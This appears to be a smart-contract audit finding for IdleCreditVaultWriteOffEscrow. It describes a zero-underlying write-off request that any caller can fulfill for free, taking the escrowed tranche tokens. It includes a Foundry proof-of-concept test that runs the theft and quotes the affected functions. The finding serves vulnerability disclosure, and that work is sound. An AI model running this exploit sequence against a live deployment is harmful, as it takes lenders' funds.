### Title
Zero-underlying write-off requests let a fulfiller steal escrowed tranche tokens - (File: `contracts/IdleCreditVaultWriteOffEscrow.sol`)

### Summary
`createWriteOffRequest` rejects a zero tranche amount but accepts `underlyingsRequested == 0`. Any caller can then fulfill that request with `_underlyings == 0`, pay no underlying, and receive all escrowed tranche tokens.

### Finding Description
During a running epoch, a lender transfers `amount` tranche tokens into escrow and stores `underlyingsRequested`. The function validates only that `amount != 0`. [1](#0-0) 

`fullfillWriteOffRequest` requires `_underlyings >= currentRequest.underlyings`. If the stored request is zero, passing zero satisfies the check. [2](#0-1) 

The fulfiller then transfers zero underlying, the calculated exit fee is zero, the lender receives zero, and the fulfiller receives `_tranches`. [3](#0-2) 

This is a direct unchecked-zero-input analog: a zero-sized payment parameter causes the escrow exchange path to transfer the full collateral without receiving consideration.

### Impact Explanation
An attacker can steal the lender’s entire escrowed tranche-token balance for zero underlying. The loss equals the economic claim represented by the escrowed tranche tokens, less any rounding dust.

### Likelihood Explanation
Exploitation requires a lender to create a request with `underlyingsRequested == 0`, but fulfillment is permissionless and requires no privileged action. Once such a request exists, any EOA can atomically claim the escrowed tranche tokens.

### Recommendation
Revert in `createWriteOffRequest` when `underlyingsRequested == 0`, matching the existing zero-tranche check. If gratuitous write-offs are intentionally supported, they should use a separate explicit path rather than the payment-request path.

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IdleCreditVaultWriteOffEscrow} from "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";

contract WriteOffEscrowZeroUnderlyingPoC is Test {
    // Fixture addresses already initialized by the existing fork/test harness.
    IdleCDOEpochVariant cdo;
    IdleCreditVaultWriteOffEscrow escrow;
    IERC20 tranche;
    address lender = makeAddr("lender");
    address attacker = makeAddr("attacker");

    function test_zeroUnderlyingRequestIsDrained() external {
        // Arrange: lender owns tranche tokens and the vault epoch is running.
        uint256 trancheAmount = 100e18;
        deal(address(tranche), lender, trancheAmount);

        // The existing escrow path only permits requests while the epoch is running.
        assertTrue(cdo.isEpochRunning());

        vm.startPrank(lender);
        tranche.approve(address(escrow), trancheAmount);

        // Vulnerable input: nonzero collateral, zero requested payment.
        escrow.createWriteOffRequest(trancheAmount, 0);
        vm.stopPrank();

        assertEq(tranche.balanceOf(address(escrow)), trancheAmount);
        assertEq(tranche.balanceOf(attacker), 0);

        // Permissionless fulfiller pays exactly zero and receives all collateral.
        vm.prank(attacker);
        escrow.fullfillWriteOffRequest(lender, trancheAmount, 0);

        assertEq(tranche.balanceOf(address(escrow)), 0);
        assertEq(tranche.balanceOf(attacker), trancheAmount);

        (uint256 remainingTranches, uint256 requested) =
            escrow.userRequests(lender);
        assertEq(remainingTranches, 0);
        assertEq(requested, 0);
    }
}

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;

  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];
